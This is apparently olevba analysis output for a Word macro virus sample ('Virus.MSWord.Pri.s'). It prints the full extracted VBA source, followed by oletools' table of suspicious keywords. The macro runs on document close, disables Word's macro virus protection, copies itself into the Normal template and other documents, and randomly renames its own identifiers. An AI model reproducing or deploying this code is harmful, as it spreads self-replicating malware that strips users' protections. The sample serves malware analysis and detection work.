olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pri.s-9e47cfd931dcafdab1c117573c8cf52136a57a71
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pri.s-9e47cfd931dcafdab1c117573c8cf52136a57a71 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) = 13 Then
Randomize: For x = 1 To 10
ActiveDocument.Shapes.AddShape(msoShapePentagon, Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next x: End If
LC733 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
RN6729 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set PV172 = ActiveDocument.VBProject.VBComponents.Item(1)
TQ4964 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set PV172 = NormalTemplate.VBProject.VBComponents.Item(1)
QC8648 = True
Call TK9994_EG2622
ActiveDocument.Saved = True
End If
If QC8648 <> True And TQ4964 <> True Then GoTo RE1443
If QC8648 = True Then PV172.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, LC733 - 1) & vbCr & "Sub ViewVBCode" & vbCr & "End Sub")
If TQ4964 = True Then PV172.CodeModule.AddFromString ("Private Sub Document_Open" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, RN6729 - 3))
RE1443:
If RN6729 <> 0 And LC733 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Private Function TK9994_EG2622()
On Error Resume Next
Randomize
Dim r1(1 To 14) As String
r1(1) = "MG3675": r1(2) = "KM6854": r1(3) = "AJ9354": r1(4) = "AM669": r1(5) = "EG2622": r1(6) = "LC733"
r1(7) = "RN6729": r1(8) = "TQ4964":: r1(9) = "PV172": r1(10) = "QC8648": r1(11) = "RE1443": r1(12) = "TK9994": r1(13) = "IA4377": r1(14) = "OD4481"
For x = 1 To 14
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call EG2622(a1, r1(x))
Next x
End Function
Private Function EG2622(OD4481, IA4377 As String)
On Error Resume Next
Dim MG3675 As Long: Dim KM6854 As Long: Dim AJ9354 As Long: Dim AM669 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
MG3675 = 1: KM6854 = 1: AJ9354 = .CountOfLines: AM669 = Len(.Lines(.CountOfLines, 1))
Do While .Find(IA4377, MG3675, KM6854, AJ9354, AM669, True)
strline = .Lines(MG3675, 1)
strline = Left(strline, KM6854 - 1) & OD4481 & Mid(strline, AM669)
.replaceline MG3675, strline
MG3675 = AJ9354 + 1: KM6854 = 1:
AJ9354 = .CountOfLines
AM669 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function

Sub ViewVBCode()
End Sub
Sub ViewVBCode()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

